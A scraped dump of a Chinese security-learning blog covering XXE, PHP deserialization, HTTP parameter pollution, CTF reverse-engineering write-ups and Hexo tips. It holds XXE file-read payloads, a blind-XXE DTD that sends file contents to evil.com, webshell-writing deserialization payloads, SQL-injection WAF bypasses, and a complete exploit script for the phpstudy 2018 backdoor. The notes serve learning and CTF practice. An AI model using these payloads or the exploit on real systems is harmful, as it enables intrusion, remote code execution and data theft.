成功！","categories":[{"name":"vulnhub","slug":"vulnhub","permalink":"https://hu5k7.github.io/categories/vulnhub/"}],"tags":[{"name":"vulnhub","slug":"vulnhub","permalink":"https://hu5k7.github.io/tags/vulnhub/"}]},{"title":"XXE漏洞学习","slug":"xxe","date":"2019-12-03T09:23:08.000Z","updated":"2020-07-10T06:35:20.016Z","comments":true,"path":"2019/12/03/xxe/","link":"","permalink":"https://hu5k7.github.io/2019/12/03/xxe/","excerpt":"0x00 前言 最近看到挺多XXE漏洞的，于是打算来浅入学习下。","text":"0x00 前言 最近看到挺多XXE漏洞的，于是打算来浅入学习下。 0x01漏洞产生 XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 0x01.1 XML基础 要了解XXE漏洞，先要搞懂一定的基础知识，了解XML文档的基础组成。 XML 指可扩展标记语言（Extensible Markup Language） XML 被设计用来传输和存储数据。 HTML 被设计用来显示数据 XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。 XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构 XML的语法规则： XML文档必须有一个根元素 XML元素都必须有一个关闭标签 XML标签对大小敏感 XML元素必须被正确的嵌套 XML属性值必须加引导 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!--XML 声明--&gt; &lt;girl age=&quot;18&quot;&gt; &lt;!--自定的根元素girl;age属性需要加引导--&gt; &lt;hair&gt;长头发&lt;/hair&gt; &lt;!--自定义的4个子元素，即girl对象的属性--&gt; &lt;eye&gt;大眼睛&lt;/eye&gt; &lt;face&gt;可爱的脸庞&lt;/face&gt; &lt;summary&gt;可爱美丽的女孩&lt;/summary&gt; &lt;/girl&gt; &lt;!--根元素的闭合--&gt; 实体引用 在XML中，一些字符拥有特殊的意义。 如果把字符&quot;&lt;&quot;放在XML元素中，会发生错误，这是因为解释器会把它作为新元素的开始。 例子: &lt;message&gt;if salary &lt; 1000 then&lt;/message&gt; 为了避免这个错误，请用实体引用来代替 “&lt;” 字符： &lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; 在 XML 中，有 5 个预定义的实体引用： &amp;lt &lt; 小于号 &amp;gt &gt; 大于号 &amp;amp &amp; 和号 &amp;apos ’ 单引号 &amp;quot &quot; 引号 DTD（文档类型定义）的作用是定义XML文档的合法构建模块 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 &lt;!--XML声明--&gt; &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt; &lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt; ]]]&gt; &lt;!--文档元素--&gt; &lt;note&gt; &lt;to&gt;Dave&lt;/to&gt; &lt;from&gt;Tom&lt;/from&gt; &lt;head&gt;Reminder&lt;/head&gt; &lt;body&gt;You are a good man&lt;/body&gt; &lt;/note&gt; 上述XML代码基本分为三个部分： 第一部分是XML的声明； 第二部分是XML的DTD文档类型定义 第三部分是XML语句 而外部实体攻击主要利用DTD的外部实体来进行注入的。 DTD有两种构建方式，分别为内部DTD声明和外部DTD声明 ​ tips: DTD = Document Type Definition 简称 内部DTD声明： &lt;!DOCTYPE 根元素 [元素声明]&gt; 实例：如上述代码 外部DTD声明： &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 实例： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt; &lt;note&gt; &lt;to&gt;Y&lt;/to&gt; &lt;from&gt;K&lt;/from&gt; &lt;head&gt;J&lt;/head&gt; &lt;body&gt;ESHLkangi&lt;/body&gt; &lt;/note&gt; 0x02 XML简单用法 &lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 外部实体: &lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体: &lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt; 或者 &lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt; 实列演示: 除参数实体外实体+内部实体 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a[ &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt; &lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt; 实列演示: 参数实体+外部实体 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a[ &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt; %name; ]&gt; 注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体 外部实体即在DTD中使用 &lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 实例演示： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a[ //定义一个外部名称 &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; //SYSTEM &quot;file:///xxxx&quot; 用于读取文件 &lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt; 得带Content-Type: application/xml头， 如果请求头类似于：Content-Type: application/json， 那么可以改为Content-Type: application/xml试试有没有xml漏洞 0x03 XXE漏洞实战 题目地址：web.jarvisoj.com:9882 我们抓包看一下 现在我们尝试把 Content-Type: application/json 改成 application/xml 发送以下内容探测是否存在XXE &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE TEST [ &lt;!ENTITY xxe &quot;XXE TEST&quot;&gt; //XXE Test是输出的内容 xxe可以为理解为一个变量 ]&gt; &lt;foo&gt; //乱取个名就好 &amp;xxe; //理解为引用变量地址输出 &lt;/foo&gt; 读取文件测试 读取flag测试 0x03.1 下面列出其他的用法 XML文档是用PHP进行解析的，那么还可以使用php:*//filter协议来进行读取。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY content SYSTEM &quot;php://filter/resource=c:/windows/win.ini&quot;&gt; ]&gt; &lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt; 端口扫描 加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。 私有类型DTD加载： &lt;!ENTITY private_dtd SYSTEM &quot;DTD_location&quot;&gt; 公共类型DTD加载： &lt;!ENTITY public_dtd PUBLIC &quot;DTD_name&quot; &quot;DTD_location&quot;&gt; 在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY portscan SYSTEM &quot;http://localhost:3389&quot;&gt; ]&gt; &lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;/foo&gt;&lt;/root&gt; blind xxe漏洞: 对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 利用DTD进行数据回显 有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root[ &lt;!ENTITY % file SYSTEM &quot;php://fileter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt; %dtd; %send;]&gt; &lt;root&gt;&lt;/root&gt; evil.dtd &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;&quot;&gt; %payload; 在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容 0x04 参考链接 我个人认为讲的最好的链接： http://xz.aliyun.com/t/6887 https://www.freebuf.com/articles/web/177979.html https://www.cnblogs.com/vincebye/p/7199290.html https://www.jianshu.com/p/ec2888780308 https://www.cnblogs.com/ESHLkangi/p/9245404.html 转载请标明出处","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"BugkuCTF逆向","slug":"BugkuCTF逆向","date":"2019-11-06T14:59:26.000Z","updated":"2020-07-10T05:31:07.383Z","comments":true,"path":"2019/11/06/BugkuCTF逆向/","link":"","permalink":"https://hu5k7.github.io/2019/11/06/BugkuCTF逆向/","excerpt":"0x00 开言 最近了解了点逆向，pwn，汇编，C，C#等知识，开始试着刷题实战一下。","text":"0x00 开言 最近了解了点逆向，pwn，汇编，C，C#等知识，开始试着刷题实战一下。 0x00.1 环境&amp;工具 工具： IDA &amp; OD 环境：Windows7 0x00.2 需要注意的事项 tips: 在windows下逆向需要注意，从windowsXP以上都有开启aslr保护， ​ ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。 0x01 入门逆向 使用ida打开发现没有任何值得，查看的。直接 按F5查看伪代码 再按R转码 就完事了. 0x02 Easy_vb ida打开 直接往下看。看到flag 0x03 Easy_re 这次使用 od工具 。直接上只能搜索看看。 0x04 游戏过关 这一题比较难。 需要用到的工具: ida &amp; od 0x04.1 第一步 IDA 我们先用 ida 和 od 打开 程序 我们先看ida这边，先看shift+f12看看字符串 发现字符串窗口有个 done!!!the flag is 这里是最后得出flag的地方，我们先不看他，往下翻 这次我们看到 Play a game\\n 这里是程序的 开头言的地方。我们双击跳过去看看。 这里有调用aPlayAGameTheNI函数。我们按x跳到，调用他的地方。 他跳到了最上面的窗口。我们往下翻 看到 input n,n 这里 是让用户输入(1-8)的地方。我们按F5看看伪代码 分析一下伪代码。 我们看到这里是给用户循环输入的地方 有个断点sub_459418();。就是我们要跳转的地方. 我们现在回到之前看到 done!!! the flag is 地方 跳转过去看一看。 看到有一个函数为 aDoneTheFlagIs, 我们打开一个选项，能直接查看到这个的 基址 我们往上翻，找到这个的Top位置 这里。0045E940我们记下来这个基址 再把 sub_459418();这里的基址记下来。 0x04.2 第二步 OD 现在我们回到 od 先这个程序运行起来。点播放键(左上角) 然后我们点Ctrl+G 来跳转地址到0045E940地方。 按F2设置断点。然后到程序里随便输入个数字(1-8),发现该程序运行到了 0045f515地址这里停住了，接下来我们用0045e940这个地址 双击0045f515地址，写上jmp 0045e940(jmp为汇编码，意思跳转) 更新程序运行。点到该程序的循环位置，为止。(0045EB51) 白框的位置便是 ｗｈｉｌｅ循环的地方 我们在0045EBC1地址设置断点 使这个程序直接跳过ｗｈｉｌｅ循环 设置断点后 点继续运行程序 拿到flag! 转载请标明出处","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hu5k7.github.io/categories/CTF/"},{"name":"CTF-Reverse-Note","slug":"CTF/CTF-Reverse-Note","permalink":"https://hu5k7.github.io/categories/CTF/CTF-Reverse-Note/"}],"tags":[{"name":"CTF-Reverse-Note","slug":"CTF-Reverse-Note","permalink":"https://hu5k7.github.io/tags/CTF-Reverse-Note/"}]},{"title":"【Pwn】学习笔记第零期:开端","slug":"pwn学习笔记-00","date":"2019-11-01T00:00:00.000Z","updated":"2020-07-10T05:31:57.592Z","comments":true,"path":"2019/11/01/pwn学习笔记-00/","link":"","permalink":"https://hu5k7.github.io/2019/11/01/pwn学习笔记-00/","excerpt":"0x00 起因 有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！","text":"0x00 起因 有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！ 0x01 需要具备的知识 1.扎实的C基础 2.基本DS：链表、队列、栈 3.基本linux配置与命令 4.会汇编更好，不会的话现学几个常用的也可以救急。 0x02 环境搭建 使用的系统: ubuntu19 工具: python - pwntools ​ pwndbg ​ ida ​ gcc-multilib 转载请标明出处","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hu5k7.github.io/categories/CTF/"},{"name":"CTF-Pwn-Note","slug":"CTF/CTF-Pwn-Note","permalink":"https://hu5k7.github.io/categories/CTF/CTF-Pwn-Note/"}],"tags":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/tags/CTF-Pwn-Note/"}]},{"title":"【Pwn】学习笔记第一期:栈知识","slug":"pwn学习笔记-01","date":"2019-11-01T00:00:00.000Z","updated":"2020-07-10T05:33:53.081Z","comments":true,"path":"2019/11/01/pwn学习笔记-01/","link":"","permalink":"https://hu5k7.github.io/2019/11/01/pwn学习笔记-01/","excerpt":"0x00 需要具备的知识","text":"0x00 需要具备的知识 编译程序的内存分配 栈区 (stack) 函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。 堆区 (heap) 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。 全局区(静态区static) 存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。 常量区(文字常量区) 存放常量字符串，程序结束后有系统释放。 代码区 存放函数体（类成员函数和全局区）的二进制代码。 0x01 堆栈(stack)知识 转载请标明出处","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hu5k7.github.io/categories/CTF/"},{"name":"CTF-Pwn-Note","slug":"CTF/CTF-Pwn-Note","permalink":"https://hu5k7.github.io/categories/CTF/CTF-Pwn-Note/"}],"tags":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/tags/CTF-Pwn-Note/"}]},{"title":"phpstudy2018_backdoor_exp","slug":"phpstudy2018-backdoor-exp","date":"2019-10-17T13:50:35.000Z","updated":"2020-07-10T05:31:55.400Z","comments":true,"path":"2019/10/17/phpstudy2018-backdoor-exp/","link":"","permalink":"https://hu5k7.github.io/2019/10/17/phpstudy2018-backdoor-exp/","excerpt":"0x00 起因 前几个星期看到phpstudy带有后门程序。拖到现在才复现,看到可利用便立即写下利用脚本","text":"0x00 起因 前几个星期看到phpstudy带有后门程序。拖到现在才复现,看到可利用便立即写下利用脚本 0x01 exp # -*-coding:utf-8 -*- import base64 import requests def Expoit(ip,exp): payload = exp pay = base64.b64encode(payload.encode('utf-8')) headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;, &quot;Accept-Charset&quot;: pay, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, } print(headers) url = ip r = requests.get(url,headers=headers) Expoit(input(&quot;target url&gt;&quot;),input(&quot;payload&gt;&quot;)) 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"php反序列化漏洞学习","slug":"PHP反序列化学习","date":"2019-10-05T00:00:00.000Z","updated":"2020-07-10T05:31:51.760Z","comments":true,"path":"2019/10/05/PHP反序列化学习/","link":"","permalink":"https://hu5k7.github.io/2019/10/05/PHP反序列化学习/","excerpt":"0x00 写在前面 PHP反序列化漏洞虽然利用的条件比较苛刻，但是如果可以利用一般都会产生很严重的后果。在春招的时候很多公司都问过这个问题，说明这个反序列化漏洞的技能点也是很多公司比较关注的技能点。","text":"0x00 写在前面 PHP反序列化漏洞虽然利用的条件比较苛刻，但是如果可以利用一般都会产生很严重的后果。在春招的时候很多公司都问过这个问题，说明这个反序列化漏洞的技能点也是很多公司比较关注的技能点。 0x01 PHP反序列化漏洞 PHP反序列化漏洞,一直围绕着两个函数serialize() 和unserialize() serialize() //是用于将类转换为一个字符串 unserialize() //用于将字符串转换回一个类 serialize() &lt;?php class fangxuliehua{ public $var1=&quot;test for fangxuliehua&quot;; } $fangxuliehua = new fangxuliehua();//根据fangxuliehua类实列化对象 $fangxueliehua_ser = serialize($fangxuliehua); print_r($fangxueliehua_ser); ?&gt; 我们这边创建了新的对象，并将他序列化打印出来。结果为： O:12:&quot;fangxuliehua&quot;:1:{s:4:&quot;var1&quot;;s:4:&quot;test&quot;;} 这里的O代表的是存储对象(Object),12则是12个字符，也就是存储对象里有12个字符。“fangxuliehua”则是对象的名称，这里的1则代表了**{s:4:“var1”;s:4:“test”;}** 里面有一个值。s表示字符串，4则长度。**“var1”**为字符串名字，后面的相同 unserialize() 与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。 &lt;?php class fanguxliehua{ public $var1=&quot;test&quot;; } $class= 'O:12:&quot;fangxuliehua&quot;:1:{s:4:&quot;var1&quot;;s:4:&quot;test&quot;;}'; print_r($class); echo &quot;&lt;/br&gt;&quot;; $class_unser=unserialize($class); print_r($class_unser); ?&gt; tips:这里使用unserialize()时，会调用__wakeup()成员函数 0x02 反序列化漏洞产生原因 当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 0x03 利用函数构造PAYLOAD Magic function php中有一类特殊的方法叫&quot;魔法函数&quot;(Magic function)， 这里我列出了与 php(反)序列化有关的几个魔法函数: __construct() //当一个对象创造时被调用 __destruct() //当对象被销毁时触发 __wakeup() //使用unserialize()时触发 __sleep() //使用serialize()时触发 __toString() //把类当作字符串使用时触发 __get() //用于从不可访问的属性读取数据 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发 __invoke() //当脚本尝试将对象调用为函数时触发 这里我们着重关注一下几个： 构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。 析构函数__destruct()：当对象被销毁时会自动调用。 __wakeup() ：如前所提，unserialize()时会自动调用。 代码如下: &lt;?php class test{ var $var='123'; function __wakeup(){ echo &quot;__wakeup&quot;.&quot;&lt;br&gt;&quot;; } function __construct(){ echo &quot;__construct&quot;.&quot;&lt;br&gt;&quot;; } function __destruct(){ echo &quot;__destruct&quot;.&quot;&lt;br&gt;&quot;; } } echo &quot;序列化所调用的函数:&quot;.&quot;&lt;br&gt;&quot;; $data=new test(); //根据test类实列化对象 $data=serialize($data); echo &quot;反序列化所调用的函数:&quot;.&quot;&lt;br&gt;&quot;; $data1=unserialize($data); print_r($data1); ?&gt; 利用示范 _wakeup() 或__destruct() 前面说了利用都是基于“自动调用”的magic function。从而当我们控制序列化字符串时可以去直接触发它们。 这里针对 __wakeup() 场景做个实验。假设index源码如下： &lt;?php class test{ var $test = 'test'; function __wakeup(){ $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ; fwrite($fp,$this-&gt;test); fclose($fp); } } $class_get = $_GET['test']; print_r($class_get); echo &quot;&lt;/br&gt;&quot;; $class_get_unser = unserialize($class_get); include_once(&quot;webshell.php&quot;) //包含一下，让它能显示效果 ?&gt; webshell.php需要自己建立。在同目录下建立了一个webshell.php，最先访问index.php 基本思路是，通过serialize()得到我们想要的序列化字符串，之后再传进去。假设我们已知index.php源码。把对象中的$test赋值再调用unserialize()时会通过__wakeup()把$test的写入到shell.php中。 我们写个php脚本: class payload{ public $target=&quot;&lt;?php $a=$_GET[cmd];system($a);?&gt;&quot;; } $a =serialize(new payload); echo $a; 序列化后输出: O:7:&quot;payload&quot;:1:{s:4:&quot;test&quot;;s:33:&quot;&quot;;} s:33:&quot;&quot;里面没有payload我们自己写进去: tips:与target=里面的?&gt;&quot;发生了冲突，还未找到解决方案 O:7:&quot;payload&quot;:1:{s:4:&quot;test&quot;;s:33:&quot;&lt;?php $a=$_GET[cmd];system($a);?&gt;&quot;;} 执行成功！ 其他Magic function的利用 但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？并不是。然而类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。 class fangxuliehua_1{ function __construct($test){ $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ; fwrite($fp,$this-&gt;test); fclose($fp); } } class fangxuliehua_2{ public $test='test'; function __wakeup(){ $obj=new fangxuliehua_1($this-&gt;test); } } $class_get = $_GET['test']; print_r($class_get); echo &quot;&lt;/br&gt;&quot;; $class_get_unser = unserialize($class_get); include_once(&quot;webshell.php&quot;);//包含一下，让它能显示效果 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new fangxuliehua_1()会自动调用对象fangxuliehua_1中的__construct()方法，从而把&lt;?php phpinfo() ?&gt;写入到 webshell.php中。 O:14:&quot;fangxuliehua_2&quot;:1:{s:4:&quot;test&quot;;s:18:&quot;&lt;?php%20phpinfo();?&gt;&quot;;} 0x04 利用普通成员方法 前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。 &lt;?php class itishead{ public $test; function __construct(){ $this-&gt;test= new itisbody(); } function __destruct(){ $this-&gt;test-&gt;action(); } } class itisbody{ function action(){ echo &quot;hereisbody:)&quot;; } } class itisfoot{ public $test2; function action(){ eval($this-&gt;test2); } } $class = new itishead(); unserialize($_GET['test']); ?&gt; 本意上，new一个新的itishead对象后，调用_construct()，其中又new了itisbody对象。在结束后会调用__destruct()，其中会调用action()，从而输出 itisbody。 利用代码: &lt;?php class itishead { var $test; function __construct() { $this-&gt;test = new itisfoot(); } } class itisfoot { var $test2 = &quot;phpinfo();&quot;; } echo serialize(new itishead()); ?&gt; 生成： O:8:&quot;itishead&quot;:1:{s:4:&quot;test&quot;;O:8:&quot;itisfoot&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}} 把payload传进去: 利用成功！ 参考链接:https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"浅谈经典漏洞HTTP参数污染","slug":"http参数污染","date":"2019-09-24T00:00:00.000Z","updated":"2020-07-10T05:31:32.625Z","comments":true,"path":"2019/09/24/http参数污染/","link":"","permalink":"https://hu5k7.github.io/2019/09/24/http参数污染/","excerpt":"0x00 问题由来 在先知社区看到一篇文章，从HTTP参数污染达成sql注入。 有点不理解HTTP参数污染是什么，于是就去翻了一些资料和看了视频过来总结一下。","text":"0x00 问题由来 在先知社区看到一篇文章，从HTTP参数污染达成sql注入。 有点不理解HTTP参数污染是什么，于是就去翻了一些资料和看了视频过来总结一下。 0x01 什么是HTTP常数污染 HTTP参数污染，简单的来说就是给一个参数附上两个或者两个以上的value。对于不同的引擎引用的value会不同。 假设: 如果是jsp+tomcat 返回的请求是第一个value， 如果php+apache 返回的请求是第二个value， 如果是asp+iis 则会返回两个一起的value 0x02 一些例子 1.假设我们有一个网站http://hacker.net/ http://hacker.net/search.php?page=10&amp;page=hacker 当服务器遇到同一个参数赋值不同数值时，会将他们连接起来，hacker可以通过这个方法来绕过黑名单例如 http://hacker.net/search.php?page=select 1&amp;page=2,3,database() 不是在黑名单中的模式，不会触发黑名单的拦截功能，其次，由于web程序会采取连接操作，将前后的内容连接起来，SQL注入行为才能够被执行 0x03 注入和HTTP参数污染有什么关系 如果该网站是采用两个一起的value一起返回，则可以用于Bypass WAF，也可以用于XSS. 最终取决于web服务器 0x04 结尾 经典的漏洞不代表现在没有，可以结合一些payload来达成过WAF。 tips:有点小乱。我看了也有点迷茫了xD 参考链接:https://v.qq.com/x/page/k0870cdqlsb.html 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"Hexo插入图片问题的总结","slug":"Hexo插入图片问题的总结","date":"2019-09-18T00:00:00.000Z","updated":"2020-07-10T05:31:29.491Z","comments":true,"path":"2019/09/18/Hexo插入图片问题的总结/","link":"","permalink":"https://hu5k7.github.io/2019/09/18/Hexo插入图片问题的总结/","excerpt":"0x00 起因: 插入图片的时候hexo-asset-image 插件会在图片的路径前面自动添加/.io/","text":"0x00 起因: 插入图片的时候hexo-asset-image 插件会在图片的路径前面自动添加/.io/ 0x01 经过了一系列的测试找出了一下几个问题: 问题1 Hexo版本以及插件不是最新 hexo v 问题2 没有用hexo n &quot;string&quot; 新增文章。 问题3 图片路径的**斜杆**问题 (/)正斜杆和( \\)反斜杆, 如果图片是直接脱进Makedown，它会写路径的是反斜杆 ![]xx\\xx.png 会让hexo-asset-image插件 自动识别成，加一个名字 正常的：BugKuCTF/xx.png 错误的：BugKuCTF/BugKuCTFxx.png 红色 是错的 蓝色 是对的 问题4 如果在旧版本的Hexo安装过，hexo-asset-image 插件 那就需要重装一遍 npm remove hexo-asset-image npm install hexo-asset-image --save 问题5 这个问题我不知道是不是所有人都会。在makedown下，不区分路径大小写，在hexo上传后网页上区分大小写 0x02 最直接最接地气解决问题的办法 就是去修改插件源代码 位置: node_modules\\hexo-asset-image\\index.js tips: 这是我个人博客hexo插入图片时出错的问题,我用的Makedown是Typora，不同的主题有不一样的渲染图片路径的方式，根据不同的方式去修改插件代码。有能力可以自己写插件=w= 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"PythonScript:Search_loaclNAS","slug":"本地NAS扫描","date":"2019-06-20T00:00:00.000Z","updated":"2020-07-10T05:30:48.702Z","comments":true,"path":"2019/06/20/本地NAS扫描/","link":"","permalink":"https://hu5k7.github.io/2019/06/20/本地NAS扫描/","excerpt":"0x00 介绍 每次都会折腾一下实训室的 软路由。不是换linux就是坏掉机子，偶尔还忘记NAS配的固定IP。 所以写下了查找本地NAS脚本。","text":"0x00 介绍 每次都会折腾一下实训室的 软路由。不是换linux就是坏掉机子，偶尔还忘记NAS配的固定IP。 所以写下了查找本地NAS脚本。 import socket import re import threading print(&quot;&quot;&quot; [搜索本地NAS-Version 0.1]\\n默认扫描最后一个网段1.1.1./24 &quot;&quot;&quot;) host = input(&quot;本地IP&gt;&quot;) def searchNAS(i): ip = host+str(i) try: Hostname = socket.gethostbyaddr(ip) match = re.search(r'NAS-SERVER',str(Hostname)).group() if match == &quot;NAS-SERVER&quot;: print(&quot;NAS服务器IP地址为 &gt; {}:{}&quot;.format(match,ip)) pass except: pass for i in range(0,256): t = threading.Thread(target=searchNAS,args=(i, )) t.start() 局域网内是DHCP会每天会更换IP，所以我打算就做了一个本地NAS的ip搜索器。方便自己找到存储服务器😗 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【BugKuCTF】靶场部分writeup","slug":"BugKuCTF","date":"2019-05-20T00:00:00.000Z","updated":"2020-07-10T05:31:03.131Z","comments":true,"path":"2019/05/20/BugKuCTF/","link":"","permalink":"https://hu5k7.github.io/2019/05/20/BugKuCTF/","excerpt":"0x00 介绍 开始做一些CTF题目了。打算在高职比赛玩玩CTFxD","text":"0x00 介绍 开始做一些CTF题目了。打算在高职比赛玩玩CTFxD 地址:https://ctf.bugku.com/challenges WEB篇 [web2] 这种类型直接看源码 F12或者Ctrl+U [计算器]------------------------------------------------------ 试着算出来,然后发现只能输入一位数，就能猜测到他限制了长度，接着我们跑到F12里面去修改即可 [web基础$_GET]------------------------------------------------------ 不解释，直接看代码 [web基础$_POST]------------------------------------------------------ 也不解释，直接看代码，需要用到抓包软件 [矛盾]------------------------------------------------------ 先看代码 问题出现在 is_numeric 